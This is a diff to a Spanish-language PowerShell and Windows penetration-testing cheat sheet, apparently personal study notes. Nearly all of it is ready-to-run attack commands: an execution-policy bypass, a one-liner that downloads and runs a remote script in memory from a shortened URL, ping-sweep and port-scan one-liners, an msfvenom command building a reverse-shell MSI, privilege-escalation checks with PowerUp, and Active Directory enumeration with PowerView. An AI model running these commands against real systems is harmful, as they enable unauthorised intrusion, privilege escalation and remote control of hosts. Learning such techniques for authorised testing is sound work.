@@ -1,11 +1,17 @@
 # iniciar powershell con permisos para correr scripts
 powershell.exe -nop -exec bypass
 
-# importar un modulo
+# importar modulos
 Import-Module PowerUp.ps1
 
 # oneLiner para correr un script
 C:\> powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”
+
+# oneLiner para hacer un ping sweep
+1..15 | %{echo "10.0.0.$_"; ping -n2 10.0.0.$_ | Select-String ttl}
+
+# oneLiner para hacer un escaneo de puertos via sockets tcp
+1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.0.$_")) "Puerto Abierto: $_"} 2>$null
 
 # Descargar + ejecutar sin tocar el disco
 C:\> powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
@@ -51,16 +57,47 @@ reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v Alw
 
 # payload
 msfvenom -p windows/shell/reverse_tcp LHOST=ip LPORT=port -f msi -o payload.msi
--
+----
 
 # CMD
 tasklist
 taskkill /pid 1234
 taskkill /F /IM notepad.exe
 whoami /priv
-Start-Process "shell.exe"
+
+Start-Process notepad.exe
+Get-Process -Name notepad
+Get-Process | Export-Csv running_processes.csv
+Get-Content ips.txt # similar a cat ips.txt
+Copy-Item ips.txt backup_ips.txt
+Move-Item ips.txt backup_ips.txt
+Get-FileHash -Algorithm MD5 ips.txt
+Get-HotFix | Format-list | findstr 'InstalledOn' 
+Get-HotFix | Format-list | findstr /C:'HotFixID' /C:'InstalledOn' # multiples busquedas
+(Get-NetUser).name # filtra solo el criterio "name"
+
 systeminfo
 net localgroup Administrators --> lista los miembros del grupo Administrators
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --> consulta los programas en autorun
 icacls.exe c:\\windows\system32\SecurityHealthSystray.exe --> muestra los permisos de ejecución de un ejecutable
+----
+# https://gist.github.com/HarmJ0y/3328d954607d71362e3c
+# PowerView
+Import-Module powerview.ps1	
+
+# Lista los usuarios y filtra por nombre o descripción
+(Get-NetUser).description
+(Get-NetUser).name
+	
+# usuarios deshabilitados
+Get-NetUser -Filter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
+
+# muestra los miembros de cada grupo
+Get-NetGroupMember 'Domain admins'
+
+# Muestra recursos compartidos con permisos de lectura
+Find-DomainShare -CheckShareAccess
+
+# Enumera GPOs
+Get-NetGPO
 
